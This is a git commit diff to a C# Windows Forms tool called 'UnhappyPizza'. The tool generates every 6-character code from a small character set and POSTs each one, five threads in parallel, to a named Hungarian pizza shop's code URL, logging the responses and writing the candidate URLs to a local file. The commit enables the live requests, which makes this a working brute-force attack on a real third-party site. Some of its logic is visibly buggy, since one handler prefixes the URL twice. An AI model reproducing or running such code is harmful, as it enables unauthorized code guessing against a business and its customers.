dfcffd5aab2198426f50b0f0b3d6dd55c61581a3
Veninger <mordana666@gmail.com>
2017-09-14 11:44:05 +0200

    its alive

--- UnhappyPizza/MainForm.Designer.cs
+++ UnhappyPizza/MainForm.Designer.cs
@@ -31,11 +31,12 @@
             this.btnStart = new System.Windows.Forms.Button();
             this.tbMain = new System.Windows.Forms.TextBox();
             this.tbUrl = new System.Windows.Forms.TextBox();
+            this.btnFeck = new System.Windows.Forms.Button();
             this.SuspendLayout();
             // 
             // btnStart
             // 
-            this.btnStart.Location = new System.Drawing.Point(637, 12);
+            this.btnStart.Location = new System.Drawing.Point(604, 12);
             this.btnStart.Name = "btnStart";
             this.btnStart.Size = new System.Drawing.Size(75, 23);
             this.btnStart.TabIndex = 0;
@@ -60,11 +61,22 @@
             this.tbUrl.TabIndex = 2;
             this.tbUrl.Text = "http://fasz/";
             // 
+            // btnFeck
+            // 
+            this.btnFeck.Location = new System.Drawing.Point(685, 13);
+            this.btnFeck.Name = "btnFeck";
+            this.btnFeck.Size = new System.Drawing.Size(75, 23);
+            this.btnFeck.TabIndex = 3;
+            this.btnFeck.Text = "plo";
+            this.btnFeck.UseVisualStyleBackColor = true;
+            this.btnFeck.Click += new System.EventHandler(this.btnFeck_Click);
+            // 
             // MainForm
             // 
             this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
             this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
             this.ClientSize = new System.Drawing.Size(794, 510);
+            this.Controls.Add(this.btnFeck);
             this.Controls.Add(this.tbUrl);
             this.Controls.Add(this.tbMain);
             this.Controls.Add(this.btnStart);
@@ -80,6 +92,7 @@
         private System.Windows.Forms.Button btnStart;
         private System.Windows.Forms.TextBox tbMain;
         private System.Windows.Forms.TextBox tbUrl;
+        private System.Windows.Forms.Button btnFeck;
     }
 }
 
--- UnhappyPizza/MainForm.cs
+++ UnhappyPizza/MainForm.cs
@@ -5,6 +5,7 @@ using System.ComponentModel;
 using System.Data;
 using System.Diagnostics;
 using System.Drawing;
+using System.IO;
 using System.Linq;
 using System.Net;
 using System.Net.Http;
@@ -17,10 +18,12 @@ namespace UnhappyPizza
 {
     public partial class MainForm : Form
     {
-        private  HttpClient HttpClient = new HttpClient();
+        private HttpClient HttpClient = new HttpClient();
+        private StringBuilder sbFinal = new StringBuilder();
         private const int lenght = 6;
         private const string url = "http://happyhotpizza.hu/kecskemet/ckkod/";
         private static char[] chars =
+
         {
             '0', '1', '2', '3', '4', '5', '6', '7', '8', '9',
             'a', 'b'
@@ -38,12 +41,18 @@ namespace UnhappyPizza
         {
             StringBuilder sb = new StringBuilder(length);
             char currentChar = chars[0];
-          
+
             for (int i = 1; i <= length; i++)
             {
                 sb.Append(currentChar);
             }
             ChangeCharacters(0, sb, length);
+            FileStream fs = new FileStream(@"C:\alma\unhappypizza.txt", FileMode.OpenOrCreate, FileAccess.Write);
+            StreamWriter sw = new StreamWriter(fs);
+            sw.Write(sbFinal.ToString());
+            sw.Close();
+
+            MessageBox.Show("fasza!!!");
         }
 
         private StringBuilder ChangeCharacters(int pos, StringBuilder sb, int length)
@@ -54,6 +63,7 @@ namespace UnhappyPizza
                 if (pos == length - 1)
                 {
                     bc.Add(sb.ToString());
+                    sbFinal.Append(url+sb.ToString() + Environment.NewLine);
                 }
                 else
                 {
@@ -67,18 +77,23 @@ namespace UnhappyPizza
             Thread MainThread = new Thread(() => StartBruteForce(lenght));
             MainThread.Start();
 
+
+
             for (int i = 0; i < 5; i++)
             {
                 Task.Factory.StartNew(() =>
                 {
+
+
                     foreach (var code in bc.GetConsumingEnumerable())
                     {
-                        //var result = SendRequest(code).Result;
+                        var result = SendRequest(code).Result;
                         //Debug.WriteLine(code);
                         //tbMain.Invoke(new Action(() => tbMain.AppendText(url + code + " " + result + Environment.NewLine)));
                         int id = Thread.CurrentThread.ManagedThreadId;
-                        tbMain.Invoke(new Action(() => tbMain.AppendText(url + code + "     " + id + Environment.NewLine)));
+                          tbMain.Invoke(new Action(() => tbMain.AppendText(code + " \t" + result + Environment.NewLine)));
                     }
+
                 });
             }
         }
@@ -88,7 +103,40 @@ namespace UnhappyPizza
         {
 
             var result = await HttpClient.PostAsync(url + code, null);
-            return  await result.Content.ReadAsStringAsync();
+            return await result.Content.ReadAsStringAsync();
+        }
+
+        private void btnFeck_Click(object sender, EventArgs e)
+        {
+            for (int i = 0; i < 5; i++)
+            {
+                Task.Factory.StartNew(() =>
+                {
+                    foreach (var code in bc.GetConsumingEnumerable())
+                    {
+                        var result = SendRequest(code).Result;
+                        //Debug.WriteLine(code);
+                        //tbMain.Invoke(new Action(() => tbMain.AppendText(url + code + " " + result + Environment.NewLine)));
+                        int id = Thread.CurrentThread.ManagedThreadId;
+                        tbMain.Invoke(new Action(() => tbMain.AppendText(code + " \t" + result + Environment.NewLine)));
+                    }
+
+                });
+            }
+
+            FileStream fs = new FileStream(@"C:\alma\unhappypizza.txt", FileMode.Open, FileAccess.Read);
+            StreamReader sr = new StreamReader(fs);
+            int count = 0;
+            while (!sr.EndOfStream)
+            {  
+                string code = sr.ReadLine();
+                bc.Add(code);
+                if (++count >= 5)
+                {
+                    break;
+                }
+            }
+            sr.Close();
         }
     }
 }
